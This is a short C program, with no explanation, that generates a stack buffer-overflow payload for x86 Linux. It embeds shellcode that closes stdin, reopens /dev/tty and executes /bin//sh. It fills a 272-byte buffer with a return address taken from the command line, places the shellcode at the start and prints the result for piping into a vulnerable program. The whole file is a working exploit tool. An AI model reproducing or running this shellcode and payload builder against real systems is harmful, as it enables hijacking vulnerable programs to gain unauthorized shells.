#include <stdlib.h>
#include <stdio.h>

char sc[] = 
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main(int argc, char **argv)
{
	char large_string[272];
	long *long_ptr = (long *) large_string;
	int i;

	for (i = 0; i < 68; i++)
	*(long_ptr + i) = (int) strtoul(argv[1], NULL, 16);
	for (i = 0; i < (int) strlen(sc); i++)
	large_string[i] = sc[i];
	printf("%s", large_string);
	return 0;
}

